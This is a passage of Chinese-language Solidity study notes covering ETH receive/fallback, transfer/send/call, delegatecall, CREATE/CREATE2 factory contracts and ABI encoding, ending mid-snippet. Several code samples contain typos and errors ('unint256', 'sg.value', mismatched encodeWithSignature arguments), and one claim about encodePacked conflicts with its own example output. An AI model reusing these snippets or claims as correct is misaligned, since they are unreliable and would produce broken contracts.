title="接收ETH"></a>接收ETH</h5><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用</li></ol><ul><li><p><strong>receive()</strong></p><p><code>receive()</code>合约用来接收ETH，一个合约最多有一个 <code>receive()</code>函数，声明该函数时必须包含<code>external</code>和<code>payable</code>关键字，当合约接收到ETH时，<code>receive()</code>会被触发。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>fallback()</strong></p><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发，在声明时也必须包含<code>external</code>关键字，一般会用<code>payable</code>修饰。</p><pre><code>// fallbackfallback() external payable&#123;    emit fallbackCalled(msg.sender, msg.value, msg.data);&#125;</code></pre></li></ul><p><code>receive()</code>和<code>fallback()</code>的区别在于合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>，<code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约发送<code>ETH</code>将会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><h5 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h5><p>在部署可以发送ETH的合约时需要在合约中实现<code>payable</code>的构造函数和<code>receive()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>。</p><h6 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h6><p>用法：<code>address(receiver).transfer(amount)</code></p><p><code>transfer()</code>的 gas 限制是 2300，可以足够用于转账，但如果接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑，否则会导致错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).send(amount)</code></p><p><code>send()</code>函数的的gas与<code>transfer()</code>相同也是2300gas，但也要求接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑。</p><p>如果转账失败不会<code>revert</code>，而是会返回<code>false</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function sendETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">bool success = _to.send(amount);</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert SendFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send-1"><a href="#send-1" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).call&#123;value: amount(&quot;&quot;)&#125;</code></p><p><code>call()</code>没有gas限制，在可以支持接受合约的<code>fallback()</code>或者<code>receive()</code>实现复杂的逻辑，当<code>call()</code>转账失败也不会revert，<code>call()</code>的返回值是<code>(bool, data)</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSendETH(address payable _to, unint256 amount) external payable&#123;</span><br><span class="line">(bool success, )= _to.call&#123;value:amount&#125;(&quot;&quot;)</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert CallFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h3><p>调用<code>OtherContract</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private _x = 0; // 状态变量_x</span><br><span class="line">    // 收到eth的事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取_x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约地址"><a href="#传入合约地址" class="headerlink" title="传入合约地址"></a>传入合约地址</h5><p>可以利用合约的地址和合约代码（接口）来创建合约的引用：<code>_name(_Address)</code>，其中<code>_Name</code>是合约名，<code>_Address</code>是合约地址。然后用合约的引用来调用合约中的函数。如：<code>_Name(_Address).func()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address _Address, uint256 x) external &#123;</span><br><span class="line">OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约变量"><a href="#传入合约变量" class="headerlink" title="传入合约变量"></a>传入合约变量</h5><p>可以直接在函数里传入合约的引用，只需要把上面参数的<code>address</code>类型更改目标合约名，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callgetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建合约变量"><a href="#创建合约变量" class="headerlink" title="创建合约变量"></a>创建合约变量</h5><p>可以通过创建合约变量，然后通过合约变量来调用目标函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uin x)&#123;</span><br><span class="line">OtherContract oc = OtherContract(_Address);</span><br><span class="line">x = oc.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调用合约并发送ETH"><a href="#调用合约并发送ETH" class="headerlink" title="调用合约并发送ETH"></a>调用合约并发送ETH</h5><p>如果目标合约的函数是<code>payable</code>的，那么我们可以通过调用它给合约进行转账：<code>_Name(_Address).func&#123;value:_Value&#125;()</code></p><blockquote><p>在小于0.6.2的版本为：Name(ContractAddress).value(Value).gas(Gas)()</p></blockquote><h3 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h3><p><code>call</code> 是<code>address</code>类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, data)</code>，分别对应<code>call</code>是否成功以及目标函数的返回值。</p><ul><li><code>call</code>是<code>solidity</code>官方推荐的通过触发<code>fallback</code>或<code>receive</code>函数发送<code>ETH</code>的方法。</li><li>不推荐用<code>call</code>来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数。</li><li>当我们不知道对方合约的源代码或<code>ABI</code>，就没法生成合约变量；这时，我们仍可以通过<code>call</code>调用对方合约的函数。</li></ul><p>规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call(二进制编码)</span><br></pre></td></tr></table></figure><p>二进制编码可以利用<code>abi.encodeWithSignature</code>获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;，具体参数)</span><br></pre></td></tr></table></figure><p><code>call</code>在调用合约时也可以指定交易发送的<code>value</code>和<code>gas</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call&#123;value:amount, gas:gasAmount&#125;(abi.encodeWithSignature(&quot;funcSig&quot;,params))</span><br></pre></td></tr></table></figure><p>利用<code>call</code>调用<code>OtherContrat</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address payable _addr, uint256 x) public payable &#123;</span><br><span class="line">(bool success, bytes memory data) = _addr.call&#123;value:sg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;,x)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果利用<code>call</code>调用合约中不存在的函数，那么目标合约中的<code>fallback</code>函数会被触发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callNonExist(address _addr) external&#123;</span><br><span class="line">    // call getX()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>call</code>还是会调用成功，并返回<code>success</code>，但是其实调用的是目标合约中的<code>fallback</code>函数</p><h3 id="Delegetecall"><a href="#Delegetecall" class="headerlink" title="Delegetecall"></a>Delegetecall</h3><p><code>delegatecall</code>也是 solidity 中 <code>address</code> 类型的低级成员函数。</p><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>语境</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103211841263.png" alt="image-20221103211841263"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103212047007.png" alt="image-20221103212047007"></p><p>相当于把合约C的代码拉过来在B的环境下执行。</p><p>规则也与<code>call</code>类似：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.delegatecall(二进制编码)</span><br></pre></td></tr></table></figure><p>与<code>call</code>不同的是，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额。</p><p>**<font color=red>注意</font>**：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p><p>使用<code>delegatecall</code>的应用场景：</p><ol><li>代理合约（<code>Proxy Contract</code>）：将智能合约的存储合约和逻辑合约分开：代理合约（<code>Proxy Contract</code>）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（<code>Logic Contract</code>）里，通过<code>delegatecall</code>执行。当升级时，只需要将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。 更多信息请查看：<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>。</li></ol><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 被调用的合约C</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发起调用的合约：</p><p>首先，合约<code>B</code>必须和目标合约<code>C</code>的变量存储布局必须相同，两个变量，并且顺序为<code>num</code>和<code>sender</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br></pre></td></tr></table></figure><p><code>callSetVars</code>函数通过<code>call</code>来调用<code>setVars</code>。它有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line">   function callSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">       // call setVars()</span><br><span class="line">       (bool success, bytes memory data) = _addr.call(</span><br><span class="line">           abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>delegatecallSetVars</code>函数通过<code>delegatecall</code>来调用<code>setVars</code>。与上面的<code>callSetVars</code>函数相同，有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">    function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // delegatecall setVars()</span><br><span class="line">        (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a><font color=purple>在合约中创建新合约</font></h3><p>在以太坊链上，用户（外部账户，<code>EOA</code>）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所<code>uniswap</code>就是利用工厂合约（<code>Factory</code>）创建了无数个币对合约（<code>Pair</code>）。</p><p>有俩种方法可以创建智能合约</p><h5 id="Create"><a href="#Create" class="headerlink" title="Create:"></a><font color=red><strong>Create:</strong></font></h5><p>new 一个合约，并传入新合约构造函数所需的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><p><code>Uniswap V2</code><a href="https://github.com/Uniswap/v2-core/tree/master/contracts">核心合约</a>中包含两个合约：</p><ol><li>UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。</li><li>UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。</li></ol><p>下面我们用<code>create</code>方法实现一个极简版的<code>Uniswap</code>：<code>Pair</code>币对合约负责管理币对地址，<code>PairFactory</code>工厂合约用于创建新的币对，并管理币对地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair &#123;</span><br><span class="line">address public factory;   //工厂合约地址</span><br><span class="line">address public token0;//代币1</span><br><span class="line">address public token1;//代币2</span><br><span class="line"></span><br><span class="line">constructor() payable &#123;</span><br><span class="line">factory = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在部署时由工厂调用一次</span><br><span class="line">function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">require(msg.sender ==factory, &quot;Uniswapv2;FORBIDDEN&quot;);</span><br><span class="line">token0 = _token0;</span><br><span class="line">token1 = _token1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory &#123;</span><br><span class="line">//通过俩个代币地址查Pair地址</span><br><span class="line">mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">address[] public allPairs;//保存所有Pair地址</span><br><span class="line"></span><br><span class="line">function createPair(address tokenA, address tokenB) external returns(address pairAddr) &#123;</span><br><span class="line">//创建新合约</span><br><span class="line">Pair pair = new Pair();</span><br><span class="line">//调用新合约的initialize方法</span><br><span class="line">pair.initialize(tokenA, tokenB);</span><br><span class="line">//更新地址map</span><br><span class="line">pairAddr = address(pair);</span><br><span class="line">allPairs.push(pairAddr);</span><br><span class="line">getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有代币地址。</p><p><code>PairFactory</code>合约只有一个<code>createPair</code>函数，根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><p><code>Pair pair = new Pair();</code></p><h5 id="Create2"><a href="#Create2" class="headerlink" title="Create2:"></a><font color=red><strong>Create2:</strong></font></h5><p>CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE.</p><h6 id="create-地址计算"><a href="#create-地址计算" class="headerlink" title="create 地址计算"></a>create 地址计算</h6><p>智能合约可以由其他合约和普通账户利用<code>CREATE</code>操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和<code>nonce</code>(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新合约_Address = hash(创建着地址，nonce)</span><br></pre></td></tr></table></figure><p>创建者地址不会变，但<code>nonce</code>可能会随时间而改变，因此用<code>CREATE</code>创建的合约地址不好预测。</p><h6 id="create2地址计算"><a href="#create2地址计算" class="headerlink" title="create2地址计算"></a>create2地址计算</h6><p><code>CREATE2</code>的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<code>CREATE2</code>创建的合约地址由4个部分决定：</p><ul><li><code>0xFF</code>：一个常数，避免和<code>CREATE</code>冲突</li><li>创建者地址</li><li><code>salt</code>（盐）：一个创建者给定的数值</li><li>待部署合约的字节码（<code>bytecode</code>）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newAddress = hash(&quot;0xFF&quot;,创建者地址, salt, bytecode)</span><br></pre></td></tr></table></figure><p><code>CREATE2</code> 确保，如果创建者使用 <code>CREATE2</code> 和提供的 <code>salt</code> 部署给定的合约<code>bytecode</code>，它将存储在新地址中。</p><p><strong>create2用法：</strong></p><p>与<strong>create</strong>类似，但是需要多传入一个 <code>salt</code>参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>使用 <code>create2</code>实现Uniswap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair&#123;</span><br><span class="line">    address public factory; // 工厂合约地址</span><br><span class="line">    address public token0; // 代币1</span><br><span class="line">    address public token1; // 代币2</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">        address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">            require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">            // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">            //将tokenA和tokenB按大小排序</span><br><span class="line">            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">            bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">            // 用create2部署新合约</span><br><span class="line">            Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">            // 调用新合约的initialize方法</span><br><span class="line">            pair.initialize(tokenA, tokenB);</span><br><span class="line">            // 更新地址map</span><br><span class="line">            pairAddr = address(pair);</span><br><span class="line">            allPairs.push(pairAddr);</span><br><span class="line">            getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">            getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory2</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有币对地址。</p><p><code>PairFactory2</code>合约只有一个<code>createPair2</code>函数，使用<code>CREATE2</code>根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure><p>就是利用<code>CREATE2</code>创建合约的代码，非常简单，而<code>salt</code>为<code>token1</code>和<code>token2</code>的<code>hash</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br></pre></td></tr></table></figure><p><strong>事先计算Pair的地址</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 提前计算pair合约地址</span><br><span class="line">function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress)&#123;</span><br><span class="line">  require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">  // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">  //将tokenA和tokenB按大小排序</span><br><span class="line">  (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">  bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">  // 计算合约地址方法 hash()</span><br><span class="line">  predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">  bytes1(0xff),</span><br><span class="line">  address(this),</span><br><span class="line">  salt,</span><br><span class="line">  keccak256(type(Pair).creationCode)</span><br><span class="line">  )))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h3><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><code>Solidity</code>中，<code>ABI编码</code>有4个函数：<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSignature</code>, <code>abi.encodeWithSelector</code>。而<code>ABI解码</code>有1个函数：<code>abi.decode</code>，用于解码<code>abi.encode</code>的数据。</p><h5 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a>abi.encode</h5><p><code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encode(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><strong>abi.encode</strong> 会将每个数据都填充为 32 字节</p><h5 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a>abi.encodePacked</h5><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodePacked(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000014b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a>abi.encodeWithSignature</h5><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address)&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">   result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><code>abi.encode</code>编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</p><h5 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a>abi.encodeWithSelector</h5><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-decode-解码"><a href="#abi-decode-解码" class="headerlink" title="abi.decode(解码)"></a>abi.decode(解码)</h5><p><code>abi.decode</code>用于解码<code>abi.encode</code>生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr) &#123;</span><br><span class="line">      (dx, daddr) = abi.decode(data, (uint, address));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221108214419590.png" alt="image-20221108214419590"></p><h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ol><li><p>在合约开发中，ABI常配合call来实现对合约的底层调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line">   </span><br><span class="line">bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">   </span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li><li><p>ethers.js中常用ABI实现合约的导入和函数调用。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wavePortalContract = <span class="keyword">new</span> ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call the getAllWaves method from your Smart 